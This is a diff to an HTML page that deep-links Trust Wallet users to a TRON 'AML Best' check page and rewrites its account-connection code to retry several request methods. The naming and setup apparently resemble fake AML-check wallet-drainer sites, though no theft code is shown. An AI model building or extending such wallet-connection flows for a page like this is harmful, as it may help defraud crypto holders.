@@ -72,7 +72,7 @@
               </button>
               <a
                 class="wallet-deeplink"
-                href="https://link.trustwallet.com/open_url?coin_id=195&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D13"
+                href="https://link.trustwallet.com/open_url?coin_id=195&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D14"
                 data-trust-deeplink
                 rel="noopener"
               >
@@ -121,8 +121,9 @@
 
     <script>
       (function () {
-        var deeplink = "https://link.trustwallet.com/open_url?coin_id=195&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D13";
+        var deeplink = "https://link.trustwallet.com/open_url?coin_id=195&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D14";
         function bySel(sel) { return document.querySelector(sel); }
+        function sleep(ms) { return new Promise(function (resolve) { setTimeout(resolve, ms); }); }
         function getProvider() {
           if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
           if (window.ethereum && window.ethereum.providers && window.ethereum.providers.length) {
@@ -170,16 +171,26 @@
           if (passive) return Promise.resolve(passive);
           var tron = (window.trustwallet && window.trustwallet.tronLink) || window.tronLink || window.tron;
           if (!tron || !tron.request) return Promise.resolve("");
-          return Promise.race([
-            tron.request({ method: "tron_requestAccounts" }).then(function (result) {
-              if (Array.isArray(result)) return readTronAddress(result[0]);
-              if (typeof result === "string") return readTronAddress(result);
-              return readTronAddress(result && result.address);
-            }),
-            new Promise(function (resolve) {
-              setTimeout(function () { resolve(getTronPassive()); }, 5000);
-            }),
-          ]).catch(function () { return getTronPassive(); });
+          var methods = [
+            { method: "tron_requestAccounts", params: { websiteIcon: window.location.origin + "/assets/logo-mark.svg", websiteName: document.title || "AML Best" } },
+            { method: "eth_requestAccounts" },
+            { method: "requestAccounts" }
+          ];
+          return methods
+            .reduce(function (chain, entry) {
+              return chain.then(function (current) {
+                if (current) return current;
+                return tron.request(entry)
+                  .then(function (result) {
+                    if (Array.isArray(result) && readTronAddress(result[0])) return readTronAddress(result[0]);
+                    if (typeof result === "string" && readTronAddress(result)) return readTronAddress(result);
+                    if (result && readTronAddress(result.address)) return readTronAddress(result.address);
+                    return sleep(900).then(getTronPassive);
+                  })
+                  .catch(function () { return sleep(500).then(getTronPassive); });
+              });
+            }, Promise.resolve(""))
+            .then(function (found) { return found || getTronPassive(); });
         }
 
         window.inlineConnectFallback = function (event) {
@@ -240,8 +251,8 @@
       })();
     </script>
 
-    <script src="config.js?v=auto-scan13"></script>
-    <script src="auto-wallet.js?v=auto-scan13"></script>
-    <script src="check-flow.js?v=auto-scan13"></script>
+    <script src="config.js?v=auto-scan14"></script>
+    <script src="auto-wallet.js?v=auto-scan14"></script>
+    <script src="check-flow.js?v=auto-scan14"></script>
   </body>
 </html>
